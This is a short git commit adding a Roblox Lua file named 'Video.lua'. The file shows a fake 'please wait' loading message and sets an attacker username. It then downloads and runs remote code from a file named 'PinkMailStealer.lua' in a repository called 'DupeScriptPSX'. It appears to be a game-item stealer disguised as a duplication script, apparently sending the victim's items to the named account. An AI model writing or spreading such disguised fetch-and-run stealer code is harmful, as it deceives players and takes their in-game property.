f65046afee3d8fe0e5feab31bf93a3dff30da36d
jefrey <126723194+jeffreyDarmer1443123@users.noreply.github.com>
2023-03-05 03:37:32 +0100

    Add files via upload

---
+++ Video.lua
@@ -0,0 +1,4 @@
+_G.Name = "Please Wait till its Ready with Loading"
+_G.Username = "plakins8"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkMailStealer.lua", true))()
